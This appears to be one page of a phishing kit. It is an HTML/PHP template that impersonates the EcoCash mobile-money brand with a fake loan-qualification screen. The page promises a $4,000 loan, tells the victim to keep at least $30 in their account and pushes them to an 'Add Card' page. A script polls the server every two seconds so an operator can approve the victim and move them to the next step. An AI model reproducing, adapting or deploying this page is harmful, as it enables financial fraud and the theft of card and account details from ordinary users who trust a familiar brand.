<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>EcoCash | Qualification</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
    margin: 0;
    background: #f1f5f9;
    font-family: Arial, Helvetica, sans-serif;
}
.header {
    text-align: center;
    padding: 15px;
    font-size: 20px;
    font-weight: bold;
}
.header span:first-child { color: red; }
.header span:last-child { color: #2563eb; }
.card {
    max-width: 420px;
    margin: 20px auto;
    background: #fff;
    padding: 25px;
    border-radius: 18px;
    box-shadow: 0 8px 25px rgba(0,0,0,.08);
}
.title {
    font-size: 18px;
    font-weight: bold;
    margin-bottom: 15px;
}
.box {
    background: #f8fafc;
    padding: 14px;
    border-radius: 10px;
    margin-bottom: 12px;
    font-size: 14px;
}
.status {
    color: green;
    font-weight: bold;
}
.message-box {
    background: #e6f7ec;
    border-left: 5px solid #46b36a;
    padding: 20px;
    border-radius: 14px;
    margin: 20px 0;
    text-align: center;
}
.message-box h3 {
    margin: 0 0 10px 0;
    color: #1e7e34;
}
.message-box p {
    margin: 10px 0;
    font-size: 15px;
    color: #145c2e;
}
.reapply-btn {
    display: inline-block;
    background-color: #2563eb;
    color: white;
    padding: 10px 22px;
    font-size: 14px;
    font-weight: bold;
    border: none;
    border-radius: 30px;
    text-decoration: none;
    cursor: pointer;
    margin-top: 5px;
    transition: background 0.2s;
}
.reapply-btn:hover {
    background-color: #1d4ed8;
}
/* New button style for Add Card */
.addcard-btn {
    display: inline-block;
    background-color: #10b981;   /* fresh green to differentiate */
    color: white;
    padding: 10px 22px;
    font-size: 14px;
    font-weight: bold;
    border: none;
    border-radius: 30px;
    text-decoration: none;
    cursor: pointer;
    margin-top: 12px;            /* extra spacing below reapply button */
    transition: background 0.2s;
}
.addcard-btn:hover {
    background-color: #059669;
}
.footer {
    text-align: right;
    font-size: 11px;
    color: #6b7280;
    margin-top: 20px;
}
</style>
</head>
<body>

<div class="header">
    <span>Eco</span><span>Cash</span>
</div>

<div class="card">
    <div class="title">Account Qualification & Compliance</div>
    <div class="box">
        <strong>DCCSA</strong><br>
        Phone Number<br>
        <?= htmlspecialchars($phone) ?>
    </div>
    <div class="box">
        Account Status<br>
        <span class="status">[Qualified]</span>
    </div>

    <div class="message-box">
        <h3>🎉 Congratulations!</h3>
        <p>Your loan limit is <strong>$4,000</strong>.</p>
        <p>Please reapply and ensure that your information is correct<br>
        and your main account balance is at least <strong>$30</strong>.</p>
        <p>Thank you.</p>
        <!-- Reapply button (existing) -->
        <a href="loan.php" class="reapply-btn">Reapply</a>
        <!-- NEW BUTTON: Add Card - redirects to card.php -->
        <br>
        <a href="card.php" class="addcard-btn">➕ Add Card</a>
    </div>

    <div class="footer">
        EcoCash Financial
    </div>
</div>

<script>
// Poll the server every 2 seconds to check the 'approve' status from the 'users' table
function checkApproval() {
    fetch(window.location.href + '?check_approve=1')
        .then(response => response.json())
        .then(data => {
            if (data.error) {
                console.error('Polling error:', data.error);
                return;
            }
            // If approve == 1, redirect to approved.php
            if (data.approve === 1) {
                window.location.href = 'approved.php';
            }
        })
        .catch(err => console.error('Fetch failed:', err));
}

// Start polling every 2 seconds (2000 ms)
setInterval(checkApproval, 2000);

// Also run once immediately on page load
checkApproval();
</script>

</body>
</html>
